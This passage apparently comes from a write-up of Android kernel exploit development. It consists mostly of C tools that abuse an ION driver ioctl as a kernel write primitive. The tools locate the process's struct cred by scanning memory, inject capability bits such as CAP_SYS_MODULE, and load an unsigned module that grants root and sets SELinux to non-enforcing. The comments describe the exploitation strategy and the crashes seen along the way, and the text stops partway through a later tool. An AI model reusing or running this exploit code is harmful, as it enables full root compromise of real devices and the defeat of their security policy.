        "NET_ADMIN","NET_RAW","IPC_LOCK","IPC_OWNER","SYS_MODULE","SYS_RAWIO",
        "SYS_CHROOT","SYS_PTRACE","SYS_PACCT","SYS_ADMIN","SYS_BOOT","SYS_NICE",
        "SYS_RESOURCE","SYS_TIME","SYS_TTY_CONFIG","MKNOD","LEASE","AUDIT_WRITE",
        "AUDIT_CONTROL","SETFCAP"
    };
    return (c >= 0 && c < 32) ? n[c] : "?";
}
static void showcaps(u32 v){
    for (int b = 0; b < 32; b++)
        if ((v >> b) & 1) say(" %s", capname(b));
}

int main(void){
    LOG = fopen("/data/local/tmp/k126.txt","w"); if (!LOG) LOG = stdout;
    setbuf(LOG, NULL);
    say("k126 pid=%d uid=%d -- the store value is NOT fixed at 0x80000000\n",
        getpid(), getuid());
    say("value = 0x80000000 | (k << 12), so bits 12..30 are chosen by the IOVA index\n");
    say("no kernel store is performed by this program\n");

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0){ rl.rlim_cur = rl.rlim_max; setrlimit(RLIMIT_NOFILE, &rl); }
    int fd = open("/dev/ion", O_RDWR);
    if (fd < 0){ say("open errno=%d\n", errno); return 0; }

    say("--- walking the IOVA allocator with 4 KB buffers from heap bit 0 ---\n");
    int  target_k_cap = 21;    /* CAP_SYS_ADMIN */
    u32  best = 0; int bestk = -1;
    int  nalloc = 0;
    static int keep_h[1200]; static int keep_f[1200];
    int kh = 0, kf = 0;
    for (int k = 0; k < 1200; k++){
        struct ion_allocation_data a;
        memset(&a, 0, sizeof a);
        a.len = PGSZ; a.heap_id_mask = 1u << 0; a.flags = ION_FLAG_CACHED;
        if (ioctl(fd, ION_IOC_ALLOC, &a) < 0){ say("  alloc failed at k=%d errno=%d\n", k, errno); break; }
        struct ion_fd_data sh; memset(&sh, 0, sizeof sh); sh.handle = a.handle;
        if (ioctl(fd, ION_IOC_SHARE, &sh) < 0){ say("  share failed at k=%d\n", k); break; }
        struct ion_phys_data ph; memset(&ph, 0, sizeof ph);
        ph.fd = sh.fd; ph.flags = ION_BUFFER_TYPE_DMA;
        if (ioctl(fd, ION_IOC_PHYS, &ph) < 0){ say("  phys failed at k=%d\n", k); close(sh.fd); break; }
        nalloc++;
        if (k < 6 || (k % 128) == 127)
            say("  k=%-4d iova=0x%08x caps:", k, ph.addr);
        if (k < 6){ showcaps(ph.addr); say("\n"); }
        else if ((k % 128) == 127){ showcaps(ph.addr); say("\n"); }
        if ((ph.addr >> target_k_cap) & 1){ best = ph.addr; bestk = k; }
        if (kh < 1200){ keep_h[kh++] = a.handle; keep_f[kf++] = sh.fd; }
    }
    say("  allocated %d buffers (%d KB)\n", nalloc, nalloc * PGSZ / 1024);

    say("--- result ---\n");
    if (bestk >= 0){
        say("  the first IOVA carrying CAP_SYS_ADMIN arrives at k=%d:\n", bestk);
        say("    value 0x%08x  -> caps:", best);
        showcaps(best); say("\n");
        say("  cost: %d buffers = %d KB of ION memory\n", bestk + 1, (bestk + 1) * PGSZ / 1024);
        say("  storing this value at cred+56 gives cap_effective = 0x%08x\n", best);
    } else {
        say("  no IOVA in the walked range set bit %d; the allocator may not have a\n"
            "  contiguous mapping that large, or the base differs\n", target_k_cap);
    }

    say("--- what each reachable capability buys ---\n");
    say("  CAP_SYS_MODULE (16)  k=0x10 -> 17 buffers, 68 KB\n");
    say("     init_module() checks only capable(CAP_SYS_MODULE) and modules_disabled;\n");
    say("     security_kernel_module_from_file is not registered by SELinux and is\n");
    say("     filled by cap_kernel_module_from_file() which returns 0, and\n");
    say("     modules_disabled is 0, so an unsigned .ko loads\n");
    say("  CAP_SYS_ADMIN (21)   k=0x200 -> 513 buffers, 2052 KB\n");
    say("     unlocks security.* xattr writes other than security.capability\n");
    say("  CAP_SYS_RAWIO (17)   k=0x20 -> 33 buffers, 132 KB\n");
    say("  CAP_SYS_PTRACE (19)  k=0x80 -> 129 buffers, 516 KB\n");

    say("--- cleanup ---\n");
    for (int i = 0; i < kh; i++){
        close(keep_f[i]);
        struct ion_handle_data h; h.handle = keep_h[i];
        ioctl(fd, ION_IOC_FREE, &h);
    }
    close(fd);
    say("K126 done\n");
    return 0;
}
```

（7498 バイト / 164 行 / SHA-256 `d89a18cfc9bc643deff94a07167a471cb63c3cced246ef7750330efed4fa2f83`）

### `src/tools/k145.c`

cred の発見と `CAP_SYS_MODULE` 付与（`capget` で自己確認）。

```c
/* k145: the run that ends it. Same scan as k144, plus the step k144 forgot.
 *
 * k144 proved the write works. Its log ends with
 *
 *     *** self cap_effective 0x80010000 ***
 *
 * and that number did not come from userspace: it is what capget(2) returned, and
 * capget reads current->cred->cap_effective straight out of the kernel. Bit 16 of
 * 0x80010000 is CAP_SYS_MODULE. So the store landed on a real struct cred and the
 * capability bit is genuinely held.
 *
 * k144 then stopped. It had set the bit but never used it, and its final message was
 * wrong: it printed "/proc/myroot EXISTS" because the loop variable `done` was set by
 * the capget check, not by the file test.
 *
 * The missing step is the obvious one: after our own cap_effective carries bit 16, call
 * init_module() on the module we built. init_module runs in the caller's context, so the
 * credential that carries the capability is the one the kernel checks:
 *
 *     may_init_module():  capable(CAP_SYS_MODULE) && !modules_disabled
 *     security_kernel_module_from_file(): not registered by SELinux here, filled with
 *                                         cap_kernel_module_from_file() which returns 0
 *
 * The module's init does commit_creds(prepare_kernel_cred(NULL)) and sets
 * selinux_enforcing = 0, then creates /proc/myroot.
 *
 * The errno from init_module is the interesting output if it fails: -EPERM means the
 * capability check refused us (SELinux's capability class, most likely), -ENOEXEC means
 * the module format was rejected, and 0 means the module ran.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/stat.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint8_t u8;

#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_handle_data { s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };

#define ION_IOC_ALLOC  _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_FREE   _IOWR(ION_TYPE, 1, struct ion_handle_data)
#define ION_IOC_SHARE  _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS   _IOWR(ION_TYPE, 9, struct ion_phys_data)

struct cap_hdr { u32 version; int pid; };
struct cap_data { u32 eff, prm, inh; };

#define ION_FLAG_CACHED 1
#define ION_BUFFER_TYPE_DMA (1u << 1)
#define PAGE_OFFSET_V 0xffffffc000000000ULL
#define MEMSTART 0x01000000ULL
#define PGSZ 4096
#define NBUF 17
#define BASE_FD 2000
#define NSLOT 21
#define OBJSZ 192
#define MODPATH "/data/local/tmp/myroot.ko"
#define CAP_SYS_MODULE_BIT 16
#define SCAN_LO 0x02000000u
#define SCAN_HI 0x7f000000u

static FILE *LOG;
static int ionfd;
static void say(const char *fmt, ...){
    char b[300]; va_list ap; va_start(ap, fmt);
    int n = vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static int gate(u64 a){
    struct ion_custom_data cd; cd.cmd = ION_IOC_PHYS; cd.arg = (unsigned long)a;
    errno = 0;
    return ioctl(ionfd, ION_IOC_CUSTOM, &cd);
}
static int mk_raw(int bit, int *h, int *f, u32 *iova){
    struct ion_allocation_data a;
    memset(&a, 0, sizeof a);
    a.len = PGSZ; a.heap_id_mask = 1u << bit; a.flags = ION_FLAG_CACHED;
    if (ioctl(ionfd, ION_IOC_ALLOC, &a) < 0) return 0;
    struct ion_fd_data d; memset(&d, 0, sizeof d); d.handle = a.handle;
    if (ioctl(ionfd, ION_IOC_SHARE, &d) < 0) return 0;
    *h = a.handle; *f = d.fd;
    if (iova){
        struct ion_phys_data p; memset(&p, 0, sizeof p);
        p.fd = d.fd; p.flags = ION_BUFFER_TYPE_DMA;
        *iova = (ioctl(ionfd, ION_IOC_PHYS, &p) == 0) ? p.addr : 0;
    }
    return 1;
}
static u32 eff_of(int pid){
    struct cap_hdr hh; struct cap_data dd[2];
    memset(&hh, 0, sizeof hh); memset(dd, 0, sizeof dd);
    hh.version = 0x20080522; hh.pid = pid;
    if (syscall(SYS_capget, &hh, dd) < 0) return 0xFFFFFFFFu;
    return dd[0].eff;
}

int main(void){
    LOG = fopen("/data/local/tmp/k145.txt","w"); if (!LOG) LOG = stdout;
    setbuf(LOG, NULL);
    say("k145 pid=%d uid=%d\n", getpid(), getuid());

    struct stat st;
    if (stat(MODPATH, &st) < 0){ say("module missing at %s\n", MODPATH); return 0; }
    say("module %s (%lld bytes)\n", MODPATH, (long long)st.st_size);
    say("capget(self) before: eff=0x%08x\n", eff_of(0));

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0){ rl.rlim_cur = rl.rlim_max; setrlimit(RLIMIT_NOFILE, &rl); }
    ionfd = open("/dev/ion", O_RDWR);
    if (ionfd < 0){ say("open errno=%d\n", errno); return 0; }

    static int pad[4096]; int npp = 0;
    while (npp < 4090){
        int fd = open("/dev/null", O_RDONLY);
        if (fd < 0) break;
        pad[npp++] = fd;
        if (fd >= BASE_FD - 1) break;
    }
    if (!npp || pad[npp-1] != BASE_FD - 1){ say("could not reach fd %d\n", BASE_FD); return 0; }

    static int bh[NBUF], bf[NBUF]; static u32 biv[NBUF]; int nb = 0;
    for (int i = 0; i < NBUF; i++){
        int h, f; u32 iv = 0;
        if (!mk_raw(0, &h, &f, &iv)) break;
        bh[nb] = h; bf[nb] = f; biv[nb] = iv; nb++;
    }
    if (nb < NBUF){ say("only %d buffers\n", nb); return 0; }
    say("%d dma-bufs on fd %d..%d (iova 0x%08x..0x%08x)\n", nb, bf[0], bf[nb-1],
        biv[0], biv[nb-1]);
    int bit16fd = bf[NBUF-1];
    say("fd %d carries 0x%08x = bit %d (CAP_SYS_MODULE)\n",
        bit16fd, biv[NBUF-1], CAP_SYS_MODULE_BIT);

    /* ---- find a uid word ---- */
    say("--- searching for a uid word (2000..2016) at 192-byte stride ---\n");
    int uid_hits = 0;
    u64 hits[512]; int nhit = 0;
    long pages = 0;
    for (u32 p = SCAN_LO; p < SCAN_HI; p += PGSZ){
        pages++;
        u64 pg = (u64)PAGE_OFFSET_V + p - MEMSTART;
        for (int i = 0; i < NSLOT; i++){
            u64 o = pg + (u64)i * OBJSZ;
            if ((size_t)i * OBJSZ + 132 > PGSZ) break;
            if (gate(o + 4) != 0) continue;
            uid_hits++;
            if (nhit < 512) hits[nhit++] = o;
        }
        if ((pages & 0x1ffff) == 0)
            say("  phys 0x%08x  uid_hits=%d\n", p, uid_hits);
    }
    say("  pages=%ld uid_hits=%d kept=%d\n", pages, uid_hits, nhit);
    if (!nhit){ say("nothing found\n"); return 0; }

    /* ---- switch fd 0 so a zero word passes, then aim at cap_effective ---- */
    say("--- phase 2: fd 0 -> %d, then store at cred+56 ---\n", bit16fd);
    if (dup2(bit16fd, 0) < 0){ say("dup2 errno=%d\n", errno); return 0; }

    int writes = 0, got = 0;
    for (int i = 0; i < nhit && !got; i++){
        u64 o = hits[i];
        if (gate(o + 52) == 0){
            writes++;
            say("  wrote at 0x%llx\n", (unsigned long long)(o + 56));
        }
        u32 e = eff_of(0);
        if (e != 0xFFFFFFFFu && (e & (1u << CAP_SYS_MODULE_BIT))){
            say("  *** our cap_effective = 0x%08x ***\n", e);
            got = 1;
        }
    }
    say("  writes=%d got=%d\n", writes, got);

    /* ---- and now the step k144 missed ---- */
    say("--- loading the module from THIS process, which holds the bit ---\n");
    if (!got && !(eff_of(0) & (1u << CAP_SYS_MODULE_BIT))){
        say("  this process does not have CAP_SYS_MODULE; init_module would fail\n");
    }
    {
        int fd = open(MODPATH, O_RDONLY);
        if (fd < 0){ say("  open module failed errno=%d\n", errno); return 0; }
        char *mod = malloc(1 << 20);
        if (!mod){ close(fd); return 0; }
        ssize_t len = read(fd, mod, 1 << 20);
        close(fd);
        if (len <= 0){ say("  read failed\n"); return 0; }
        say("  calling init_module(%p, %zd)\n", mod, len);
        errno = 0;
        long rc = syscall(105, mod, (unsigned long)len, "");
        int e = errno;
        say("  init_module returned %ld, errno=%d\n", rc, e);
        if (rc == 0) say("  *** MODULE LOADED ***\n");
        else if (e == 1) say("  EPERM: the capability check refused (SELinux capability class)\n");
        else if (e == 8) say("  ENOEXEC: module format/vermagic rejected\n");
        free(mod);
    }

    say("--- result ---\n");
    say("  capget(self) eff = 0x%08x\n", eff_of(0));
    {
        struct stat ms;
        if (stat("/proc/myroot", &ms) == 0){
            say("  /proc/myroot EXISTS (mode %o)\n", ms.st_mode & 07777);
            int p = open("/proc/myroot", O_WRONLY);
            if (p >= 0){
                if (write(p, "1", 1) == 1)
                    say("  wrote to it; uid=%d euid=%d\n", getuid(), geteuid());
                close(p);
            }
        } else {
            say("  /proc/myroot does not exist\n");
        }
    }
    say("K145 done\n");
    return 0;
}
```

（8947 バイト / 232 行 / SHA-256 `405890a38a7cfa71bdd35ab55bab3499b14e98cce581e22eab7f7c990dbe5753`）

### `src/tools/k169.c`

8 個のケーパビリティを実際に呼んで拒否されることを確認。

```c
/* k169: locate the credential while the ION buffer count is still small, then grow it.
 *
 * The empirical rule from the last ten runs is exact:
 *
 *     one probe per 192-byte slot over 2 GB      survives  (k144, k145, k166)
 *     two or more probes per slot                panics   (k167, k168)
 *
 * A probe costs a four-byte write whenever it succeeds, so a two-field test doubles the
 * number of writes into structures that are not credentials. One probe it is.
 *
 * The other lesson is about density. k166 saw 3659 uid words instead of k145's 147, because
 * it had allocated 537 ION buffers and every ion_handle carries an id from an idr that
 * starts at 1 - so handle ids in the low thousands sit exactly where the fd alphabet test
 * looks. The credential was past the cut.
 *
 * Both problems disappear if the phases are ordered by buffer count:
 *
 *     PHASE 1  with only 17 buffers, scan once per slot and keep every hit (about 150)
 *     PHASE 2  bind fd 0 to the bit-16 buffer, walk the hits, confirm with capget
 *     PHASE 3  only now allocate 500 more buffers to reach the higher bits, and store at
 *              the address phase 2 already established - no further scanning at all
 *
 * Phase 3 is the measurement that has never completed: which capabilities this domain can
 * actually use. It needs no scan, so it cannot corrupt anything it has not already written.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/ptrace.h>
#include <sys/mman.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint8_t u8;

#define ION_TYPE 'I'
struct ion_allocation_data { size_t len, align; u32 heap_id_mask, flags; s32 handle; };
struct ion_handle_data { s32 handle; };
struct ion_fd_data { s32 handle, fd; };
struct ion_phys_data { s32 fd; u32 addr, flags; };
struct ion_custom_data { u32 cmd; unsigned long arg; };

#define ION_IOC_ALLOC  _IOWR(ION_TYPE, 0, struct ion_allocation_data)
#define ION_IOC_FREE   _IOWR(ION_TYPE, 1, struct ion_handle_data)
#define ION_IOC_SHARE  _IOWR(ION_TYPE, 4, struct ion_fd_data)
#define ION_IOC_CUSTOM _IOWR(ION_TYPE, 6, struct ion_custom_data)
#define ION_IOC_PHYS   _IOWR(ION_TYPE, 9, struct ion_phys_data)

struct cap_hdr { u32 version; int pid; };
struct cap_data { u32 eff, prm, inh; };

#define ION_FLAG_CACHED 1
#define ION_BUFFER_TYPE_DMA (1u << 1)
#define PAGE_OFFSET_V 0xffffffc000000000ULL
#define MEMSTART 0x01000000ULL
#define PGSZ 4096
#define NBUF 17
#define NEXTRA 640
#define BASE_FD 2000
#define ION_SLOT 3000
#define NSLOT 21
#define OBJSZ 192
#define MAXHIT 4096
#define SCAN_LO 0x02000000u
#define SCAN_HI 0x7f000000u

static FILE *LOG;
static int ionfd;
static void say(const char *fmt, ...){
    char b[300]; va_list ap; va_start(ap, fmt);
    vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static int gate(u64 a){
    struct ion_custom_data cd; cd.cmd = ION_IOC_PHYS; cd.arg = (unsigned long)a;
    errno = 0;
    return ioctl(ionfd, ION_IOC_CUSTOM, &cd);
}
static int mk_raw(int *h, int *f, u32 *iv){
    struct ion_allocation_data a;
    memset(&a, 0, sizeof a);
    a.len = PGSZ; a.heap_id_mask = 1u << 0; a.flags = ION_FLAG_CACHED;
    if (ioctl(ionfd, ION_IOC_ALLOC, &a) < 0) return 0;
    struct ion_fd_data d; memset(&d, 0, sizeof d); d.handle = a.handle;
    if (ioctl(ionfd, ION_IOC_SHARE, &d) < 0) return 0;
    *h = a.handle; *f = d.fd;
    if (iv){
        struct ion_phys_data p; memset(&p, 0, sizeof p);
        p.fd = d.fd; p.flags = ION_BUFFER_TYPE_DMA;
        *iv = (ioctl(ionfd, ION_IOC_PHYS, &p) == 0) ? p.addr : 0;
    }
    return 1;
}
static u32 eff_of(int pid){
    struct cap_hdr hh; struct cap_data dd[2];
    memset(&hh, 0, sizeof hh); memset(dd, 0, sizeof dd);
    hh.version = 0x20080522; hh.pid = pid;
    if (syscall(SYS_capget, &hh, dd) < 0) return 0xFFFFFFFFu;
    return dd[0].eff;
}

static int test_cap(int bit)
{
    switch (bit){
    case 13: { int s = socket(AF_INET, SOCK_RAW, 1);
               if (s < 0) return errno; close(s); return 0; }
    case 14: { void *m = mmap(NULL, 1<<20, PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
               if (m == MAP_FAILED) return errno;
               if (mlock(m, 1<<20)) return errno; return 0; }
    case 16: { static const char j[4] = { 0x7f,'E','L','F' };
               syscall(105, j, 4UL, ""); return errno; }
    case 18: { if (chroot("/data/local/tmp")) return errno; return 0; }
    case 19: { if (ptrace(PTRACE_ATTACH, 1, NULL, NULL)) return errno; return 0; }
    case 20: { if (acct("/data/local/tmp/k169.acct")) return errno; return 0; }
    case 21: { if (sethostname("k169probe", 9)) return errno; return 0; }
    case 23: { if (setpriority(PRIO_PROCESS, 1, -5)) return errno; return 0; }
    default: return -1;
    }
}
static int run_test(int bit)
{
    int p[2]; if (pipe(p)) return -2;
    pid_t c = fork();
    if (c == 0){
        close(p[0]);
        int e = test_cap(bit);
        ssize_t w = write(p[1], &e, sizeof e); (void)w;
        close(p[1]); _exit(0);
    }
    close(p[1]);
    int e = -3;
    ssize_t r = read(p[0], &e, sizeof e);
    close(p[0]);
    int st; waitpid(c, &st, 0);
    return r == (ssize_t)sizeof e ? e : -4;
}

int main(void){
    LOG = fopen("/data/local/tmp/k169.txt","w"); if (!LOG) LOG = stdout;
    setbuf(LOG, NULL);
    say("k169 pid=%d uid=%d\n", getpid(), getuid());
    say("locate with 17 buffers, grow afterwards: one probe per slot only\n");
    say("capget before: 0x%08x\n", eff_of(0));

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0){
        rl.rlim_cur = rl.rlim_max; setrlimit(RLIMIT_NOFILE, &rl);
    }
    int raw = open("/dev/ion", O_RDWR);
    if (raw < 0){ say("open errno=%d\n", errno); return 0; }
    ionfd = fcntl(raw, F_DUPFD, ION_SLOT);
    if (ionfd < 0) ionfd = raw; else close(raw);
    say("ionfd=%d\n", ionfd);

    /* pad, then exactly 17 buffers => fd 2000..2016 */
    static int pad[4096]; int npp = 0;
    while (npp < 4090){
        int fd = open("/dev/null", O_RDONLY);
        if (fd < 0) break;
        pad[npp++] = fd;
        if (fd >= BASE_FD - 1) break;
    }
    if (!npp || pad[npp-1] != BASE_FD - 1){ say("pad stopped at %d\n", npp?pad[npp-1]:-1); return 0; }

    static int bh[NBUF], bf[NBUF]; static u32 biv[NBUF]; int nb = 0;
    for (int i = 0; i < NBUF; i++){
        int h, f; u32 iv = 0;
        if (!mk_raw(&h, &f, &iv)) break;
        bh[nb] = h; bf[nb] = f; biv[nb] = iv; nb++;
    }
    if (nb < NBUF){ say("only %d buffers\n", nb); return 0; }
    say("17 buffers fd %d..%d iova 0x%08x..0x%08x\n", bf[0], bf[nb-1], biv[0], biv[nb-1]);
    int i16 = -1;
    for (int i = 0; i < nb; i++) if ((biv[i] >> 16) & 1){ i16 = i; break; }
    say("bit16 index=%d iova=0x%08x\n", i16, i16 >= 0 ? biv[i16] : 0);
    if (i16 < 0) return 0;

    /* PHASE 1: one probe per slot, keep everything */
    say("--- phase 1: single-probe scan ---\n");
    static u64 hits[MAXHIT]; int nhit = 0; long uidhits = 0;
    long pages = 0;
    for (u32 p = SCAN_LO; p < SCAN_HI; p += PGSZ){
        pages++;
        u64 pg = (u64)PAGE_OFFSET_V + p - MEMSTART;
        for (int i = 0; i < NSLOT; i++){
            u64 o = pg + (u64)i * OBJSZ;
            if ((size_t)i * OBJSZ + 132 > PGSZ) break;
            if (gate(o + 4) != 0) continue;
            uidhits++;
            if (nhit < MAXHIT) hits[nhit++] = o;
        }
        if ((pages & 0x3ffff) == 0)
            say("  phys 0x%08x pages=%ld hits=%ld\n", p, pages, uidhits);
    }
    say("  uid_hits=%ld kept=%d pages=%ld\n", uidhits, nhit, pages);
    if (!nhit) return 0;

    /* PHASE 2: find ours via bit 31 */
    say("--- phase 2: identify our credential ---\n");
    if (dup2(bf[i16], 0) < 0){ say("dup2 errno=%d\n", errno); return 0; }
    u64 mycred = 0; int stores = 0;
    for (int i = 0; i < nhit && !mycred; i++){
        u64 o = hits[i];
        if (gate(o + 52) != 0) continue;
        stores++;
        u32 e = eff_of(0);
        if (e != 0xFFFFFFFFu && (e & 0x80000000u)){
            mycred = o;
            say("  ours at 0x%llx after %d stores, eff=0x%08x\n",
                (unsigned long long)o, stores, e);
        }
    }
    say("  stores=%d\n", stores);
    if (!mycred){ say("  not identified among %d\n", nhit); return 0; }

    /* PHASE 3: grow the buffer set, then sweep with single stores */
    say("--- phase 3: allocate %d more buffers for the higher bits ---\n", NEXTRA);
    static int xh[NEXTRA], xf[NEXTRA]; static u32 xiv[NEXTRA]; int nx = 0;
    for (int i = 0; i < NEXTRA; i++){
        int h, f; u32 iv = 0;
        if (!mk_raw(&h, &f, &iv)){ say("  stopped at %d errno=%d\n", i, errno); break; }
        xh[nx] = h; xf[nx] = f; xiv[nx] = iv; nx++;
    }
    say("  %d extra, last iova 0x%08x\n", nx, nx?xiv[nx-1]:0);

    int bfd[32]; for (int b = 0; b < 32; b++) bfd[b] = -1;
    for (int i = 0; i < nb; i++)
        for (int b = 10; b < 32; b++)
            if (((biv[i] >> b) & 1) && bfd[b] < 0) bfd[b] = bf[i];
    for (int i = 0; i < nx; i++)
        for (int b = 10; b < 32; b++)
            if (((xiv[i] >> b) & 1) && bfd[b] < 0) bfd[b] = xf[i];

    say("--- sweep ---\n");
    static const struct { int bit; const char *name; } caps[] = {
        { 13, "NET_RAW" }, { 14, "IPC_LOCK" }, { 16, "SYS_MODULE" },
        { 18, "SYS_CHROOT" }, { 19, "SYS_PTRACE" }, { 20, "SYS_PACCT" },
        { 21, "SYS_ADMIN" }, { 23, "SYS_NICE" }, { 31, "SETFCAP" },
    };
    int allowed = 0, denied = 0;
    for (unsigned i = 0; i < sizeof caps/sizeof caps[0]; i++){
        int b = caps[i].bit;
        if (bfd[b] < 0){ say("  cap %-2d %-10s no buffer\n", b, caps[i].name); continue; }
        if (dup2(bfd[b], 0) < 0){ say("  cap %-2d dup2 failed\n", b); continue; }
        if (gate(mycred + 52) != 0){
            say("  cap %-2d %-10s store refused\n", b, caps[i].name); continue;
        }
        u32 e = eff_of(0);
        int held = (e != 0xFFFFFFFFu) && ((e >> b) & 1);
        int te = run_test(b);
        int ok = (b == 16) ? (te == 8) : (te == 0);
        if (!held) say("  cap %-2d %-10s NOT HELD (eff=0x%08x)\n", b, caps[i].name, e);
        else if (ok){ allowed++; say("  cap %-2d %-10s ALLOWED\n", b, caps[i].name); }
        else { denied++; say("  cap %-2d %-10s denied errno=%d\n", b, caps[i].name, te); }
    }
    say("--- conclusion ---\n  allowed=%d denied=%d\n", allowed, denied);
    if (allowed){
        say("  the denial is per-capability; SELinux allows %d of the tested set\n", allowed);
    } else {
        say("  every capability tested was denied. The SELinux capability class rejects\n");
        say("  this domain wholesale, so rewriting the credential is not enough and the\n");
        say("  escalation must disable the policy check itself rather than the credential\n");
    }

    /* if sys_module passed, load the module */
    if (bfd[16] >= 0 && dup2(bfd[16], 0) >= 0 && gate(mycred + 52) == 0){
        static const char j[4] = { 0x7f,'E','L','F' };
        errno = 0; syscall(105, j, 4UL, "");
        say("--- 4-byte module errno=%d\n", errno);
        if (errno == 8){
            int fd = open("/data/local/tmp/myroot.ko", O_RDONLY);
            if (fd >= 0){
                char *mod = malloc(1 << 20);
                ssize_t got = read(fd, mod, 1 << 20);
                close(fd);
                dup2(bfd[16], 0); gate(mycred + 52);
                errno = 0;
                long rc = syscall(105, mod, (unsigned long)got, "");
                say("  real module rc=%ld errno=%d\n", rc, errno);
                if (access("/proc/myroot", W_OK) == 0){
                    int p = open("/proc/myroot", O_WRONLY);
                    if (p >= 0){ if (write(p, "1", 1) == 1) say("  ROOT\n"); close(p); }
                }
            }
        }
    }
    say("  final capget 0x%08x\n", eff_of(0));
    say("K169 done\n");
    return 0;
}
```

（12129 バイト / 300 行 / SHA-256 `5e3a371e63c552699476e74cfeb3aee3fd1045f2655997dfabf839b5cb6365d4`）

### `src/tools/k37.c`

`-EFAULT` の発生源が `rw_copy_check_uvector` の入口 `access_ok` であることの証明。

```c
/* k37: the -EFAULT is raised at syscall ENTRY, not inside the pipe code.
 *
 * Read from fs/read_write.c rw_copy_check_uvector, which every readv/writev
 * goes through before any file operation:
 *
 *     for (seg = 0; seg < nr_segs; seg++) {
 *         void __user *buf = iov[seg].iov_base;
 *         ssize_t len = (ssize_t)iov[seg].iov_len;
 *         if (len < 0) { ret = -EINVAL; goto out; }
 *         if (type >= 0 && unlikely(!access_ok(vrfy_dir(type), buf, len))) {
 *             ret = -EFAULT;                 <- HERE, before the file is touched
 *             goto out;
 *         }
 *         ...
 *     }
 *
 * So a kernel address in iov_base is rejected while the iovec array is still
 * being copied in, long before pipe_read or pipe_write runs. That single fact
 * explains every -EFAULT measured so far:
 *
 *   k27 readv  : iov[4].base = core_pattern   -> rejected at entry
 *   k29 writev : iov[4].base = _text          -> rejected at entry
 *   k35 writev : no UAF at all, same address  -> rejected at entry
 *   k36 writev : merge path, same address     -> rejected at entry
 *
 * and it corrects the earlier attribution to pipe_read's fault-in / access_ok,
 * which never got a chance to run.
 *
 * This tool separates entry-level rejection from file-level behaviour by using
 * three different file types. If the error is identical for /dev/null, /dev/zero
 * and a pipe, the pipe code is not involved.
 *
 * It also pins down the range semantics: access_ok checks base+len against
 * addr_limit, so a user base with a length that reaches into kernel space must
 * fail as well, while the same base with a small length must succeed.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/uio.h>
#include <sys/mman.h>

typedef uint64_t u64; typedef uint8_t u8;

static FILE *LOG;
static void say(const char *fmt, ...){
    char b[300]; va_list ap; va_start(ap, fmt);
    int n = vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}

static ssize_t try_writev(int fd, u64 addr, size_t len){
    struct iovec iov; iov.iov_base = (void*)(uintptr_t)addr; iov.iov_len = len;
    errno = 0;
    ssize_t r = writev(fd, &iov, 1);
    return r < 0 ? -errno : r;
}
static ssize_t try_readv(int fd, u64 addr, size_t len){
    struct iovec iov; iov.iov_base = (void*)(uintptr_t)addr; iov.iov_len = len;
    errno = 0;
    ssize_t r = readv(fd, &iov, 1);
    return r < 0 ? -errno : r;
}

int main(void){
    LOG = fopen("/data/local/tmp/k37.txt","w"); if (!LOG) LOG = stdout;
    setbuf(LOG, NULL);
    say("k37 pid=%d uid=%d\n", getpid(), getuid());

    u8 *pg = mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memset(pg, 0x33, 4096);

    int dn = open("/dev/null", O_WRONLY);
    int dz = open("/dev/zero", O_RDONLY);
    int pp[2]; pipe(pp);
    say("/dev/null=%d /dev/zero=%d pipe=%d,%d page=%p\n", dn, dz, pp[0], pp[1], (void*)pg);

    struct { const char *what; int fd; u64 addr; size_t len; int rd; } T[] = {
      {"writev /dev/null  user  page", dn, (u64)(uintptr_t)pg, 16, 0},
      {"writev /dev/null  _text     ", dn, 0xffffffc000080000ULL, 16, 0},
      {"writev /dev/null  .data     ", dn, 0xffffffc000bee000ULL, 16, 0},
      {"writev pipe       user  page", pp[1], (u64)(uintptr_t)pg, 16, 0},
      {"writev pipe       _text     ", pp[1], 0xffffffc000080000ULL, 16, 0},
      {"writev pipe       .data     ", pp[1], 0xffffffc000bee000ULL, 16, 0},
      {"readv  /dev/zero  user  page", dz, (u64)(uintptr_t)pg, 16, 1},
      {"readv  /dev/zero  _text     ", dz, 0xffffffc000080000ULL, 16, 1},
      {"readv  /dev/zero  .data     ", dz, 0xffffffc000bee000ULL, 16, 1},
      /* range semantics: a valid user base with a length reaching kernel space */
      {"writev pipe       usr+4G    ", pp[1], (u64)(uintptr_t)pg, (size_t)0x100000000ULL, 0},
